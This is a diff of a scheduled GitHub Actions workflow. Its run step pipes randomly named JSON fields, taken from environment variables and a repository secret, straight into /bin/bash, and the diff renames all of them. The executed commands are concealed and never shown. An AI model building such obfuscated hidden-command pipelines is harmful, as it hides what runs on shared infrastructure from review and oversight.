@@ -2,7 +2,8 @@ name: pengqi19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 0/6 * * *'
+    - cron: '6 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengqi19871010
         env:
-          gkoh366: ${{ secrets.gkoh366 }}
+          wrn90: ${{ secrets.wrn90 }}
         run: |
-          echo $gkoh366 | jq -r .q2 | /bin/bash
-          echo $jr0 | jq -r .vwuw946 | /bin/bash
-          echo $pbn1393 | jq -r .xqlob0 | /bin/bash
-          echo $q1 | jq -r .zzvpy3598 | /bin/bash
-          echo $yapkp073 | jq -r .cuah097 | /bin/bash
+          echo $wrn90 | jq -r .v54 | /bin/bash
+          echo $n3 | jq -r .iflg094 | /bin/bash
+          echo $kbxo41 | jq -r .fg94 | /bin/bash
+          echo $rd4983 | jq -r .b15 | /bin/bash
+          echo $frj1 | jq -r .x777 | /bin/bash
+          echo $ihjx34011 | jq -r .jiu423 | /bin/bash
+          echo $a34927 | jq -r .vjbez8758 | /bin/bash
 
